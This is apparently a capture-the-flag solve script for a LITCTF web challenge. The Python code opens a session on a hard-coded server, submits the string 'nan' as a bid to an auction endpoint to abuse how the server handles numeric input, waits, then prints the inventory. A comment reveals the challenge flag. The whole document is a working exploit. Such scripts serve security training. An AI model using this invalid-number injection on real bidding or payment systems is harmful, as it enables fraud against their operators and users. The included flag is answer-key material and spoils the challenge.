import requests
import time

url = "http://34.44.129.8:56463"

s = requests.Session()
s.get(f"{url}/register")
s.post(f"{url}/bid", data={"item_id": "2", "bid": "nan"})

time.sleep(100)
resp = s.get(f"{url}/inventory")
print(resp.text)

# LITCTF{we_shall_never_have_error_500_at_the_most_critical_times}
